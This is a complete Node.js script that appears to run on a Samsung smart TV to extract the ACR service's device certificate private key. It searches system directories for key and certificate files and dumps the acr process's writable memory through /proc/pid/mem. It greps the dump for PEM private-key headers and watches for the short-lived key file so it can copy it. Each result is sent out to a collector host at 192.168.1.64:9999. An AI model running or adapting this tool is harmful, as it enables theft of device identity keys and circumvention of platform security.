"use strict";
// audit94.js - ACR private key extraction. Recon + catch + dump acr rw memory.
// acr writes SamsungDeviceCertificateKey.pem at runtime (m_WriteCertificationKeyFile)
// then deletes it (m_RemoveCertificationFiles / ClearCertificationFiles).
// We: (a) list cert/tmp dirs + find securestorage daemon, (b) dump acr rw mem
// to /tmp for PC-side PEM/DER scan, (c) background-watch for the key file.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// 1. cert dirs + any key/cert files
out.ls_cert = sh("ls -la /usr/lib/acr/cert/ 2>&1", 1500);
out.ls_tmpacr = sh("ls -la /tmp/acr/ 2>&1", 1500);
out.find_keys = sh("find /usr/lib/acr /tmp /opt/etc /opt/usr /opt/data /opt/var -iname '*Key*' -o -iname '*DeviceCert*' -o -iname '*.pem' 2>/dev/null | head -40", 3000);

// 2. securestorage daemon
out.ss_proc = sh("ps 2>/dev/null | grep -iE 'securestorage|key-manager|security' | grep -v grep | head -10", 1500);
out.ss_files = sh("find /opt/data /opt/etc /opt/var /usr/lib/acr -iname '*securestorage*' -o -iname '*ss_data*' -o -iname '*credential*' 2>/dev/null | head -30", 2500);

// 3. acr pid + rw mem region sizes
out.pidof = sh("pidof acr", 200);
var pm = trim(out.pidof).match(/^(\d+)/);
var pid = pm ? pm[1] : null;
out.pid = pid;

if (pid) {
    // dump rw-p + rwxp regions of acr to /tmp/acr_mem.bin (for PC-side scan)
    out.mem_dump = sh("cat /proc/" + pid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.acrmap; wc -l /tmp/.acrmap; > /tmp/acr_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + pid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem.bin; done < /tmp/.acrmap; ls -la /tmp/acr_mem.bin", 1200);

    // quick in-TV grep for PEM markers in the dumped mem
    out.pem_hits = sh("grep -aob -e 'BEGIN RSA PRIVATE' -e 'BEGIN PRIVATE' -e 'BEGIN ENCRYPTED' -e 'BEGIN EC PRIVATE' /tmp/acr_mem.bin | head -20", 2000);
    out.ss_read_hits = sh("grep -aob -e 'SamsungDeviceCertificateKey' -e 'ss_read' /tmp/acr_mem.bin | head -10", 1500);

    // also dump the whole acr file-buffers / heap strings around PEM
    out.pem_ctx = sh("grep -aob 'BEGIN' /tmp/acr_mem.bin | head -30", 2000);
}

post("/p94_recon", out);
post("/p94_done", { started: out.started });

// 4. background watcher: poll cert dirs every 2s for 120s, copy key file if it appears
var t0 = Date.now();
var iv = setInterval(function () {
    var f = sh("for d in /usr/lib/acr/cert /tmp/acr /tmp /opt/usr/home/owner; do for x in $d/*Key* $d/*DeviceCert* $d/*.pem; do if [ -f \"$x\" ]; then echo \"FOUND $x $(md5sum $x 2>/dev/null) $(wc -c < $x)\"; cp -f \"$x\" /opt/usr/home/owner/caught_$(basename $x) 2>/dev/null && echo COPIED; fi; done; done", 2500);
    if (f.indexOf("FOUND") >= 0) {
        post("/p94_caught", { at: new Date().toISOString(), detail: f });
    }
    if (Date.now() - t0 > 120000) {
        clearInterval(iv);
        post("/p94_watchdone", { at: new Date().toISOString() });
    }
}, 2000);
